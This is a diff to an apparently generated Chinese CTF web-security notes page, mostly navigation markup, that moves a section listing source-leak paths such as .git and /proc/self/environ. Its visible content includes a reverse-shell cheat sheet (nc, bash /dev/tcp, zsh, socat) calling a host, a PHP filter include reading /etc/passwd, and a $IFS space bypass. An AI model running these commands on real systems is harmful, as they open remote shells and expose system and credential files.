@@ -110,7 +110,7 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
     
-      <a href="#_1" tabindex="1" class="md-skip">
+      <a href="#shell" tabindex="1" class="md-skip">
         跳转至
       </a>
     
@@ -1957,6 +1957,18 @@
 
 
   <li class="md-nav__item">
+    <a href="../../reverse/加密与解密/" title="加密与解密" class="md-nav__link">
+      加密与解密
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
     <a href="../../reverse/反调试/" title="反调试" class="md-nav__link">
       反调试
     </a>
@@ -2042,13 +2054,6 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" title="基础脑洞/思路" class="md-nav__link">
-    基础脑洞/思路
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#shell" title="反弹shell" class="md-nav__link">
     反弹shell
   </a>
@@ -2072,6 +2077,13 @@
         <li class="md-nav__item">
   <a href="#ifs" title="$IFS" class="md-nav__link">
     $IFS
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="敏感文件" class="md-nav__link">
+    敏感文件
   </a>
   
 </li>
@@ -2386,13 +2398,6 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" title="基础脑洞/思路" class="md-nav__link">
-    基础脑洞/思路
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
   <a href="#shell" title="反弹shell" class="md-nav__link">
     反弹shell
   </a>
@@ -2416,6 +2421,13 @@
         <li class="md-nav__item">
   <a href="#ifs" title="$IFS" class="md-nav__link">
     $IFS
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="敏感文件" class="md-nav__link">
+    敏感文件
   </a>
   
 </li>
@@ -2447,14 +2459,7 @@
                 
                   <h1>Basic</h1>
                 
-                <h2 id="_1">基础脑洞/思路<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<ol>
-<li>index.php?id=1  遍历id 注入</li>
-<li>robots.txt .git .svn .swp ~ .bak 源码，目录泄露
-  .git泄露利用EXP
-  <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></li>
-</ol>
-<h2 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h2>
+                <h2 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h2>
 <div class="codehilite"><pre><span></span>nc -e /bin/bash <span class="m">192</span>.168.1.2 <span class="m">8080</span>
 bash -c <span class="s1">&#39;bash -i &gt;/dev/tcp/192.168.1.2/8080 0&gt;&amp;1&#39;</span>
 zsh -c <span class="s1">&#39;zmodload zsh/net/tcp &amp;&amp; ztcp 192.168.1.2 8080 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY&#39;</span>
@@ -2468,6 +2473,10 @@ socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,s
 <p><code>include(‘php://filter/string.strip_tags/resource=/etc/passwd’)</code></p>
 <h2 id="ifs">$IFS<a class="headerlink" href="#ifs" title="Permanent link">&para;</a></h2>
 <p>空格可以使用$IFS代替</p>
+<h2 id="_1">敏感文件<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>robots.txt .git .svn .swp ~ .bak 源码，目录泄露
+.git泄露利用EXP:<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a>
+进程环境变量: /proc/self/environ </p>
                 
                   
                 
